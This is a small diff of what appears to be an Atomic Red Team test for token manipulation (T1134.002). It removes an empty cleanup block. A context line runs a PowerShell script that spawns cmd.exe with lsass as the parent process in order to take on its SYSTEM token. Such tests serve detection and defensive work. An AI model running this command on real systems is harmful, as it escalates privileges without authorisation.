@@ -23,6 +23,3 @@ steps:
         Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
         & "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
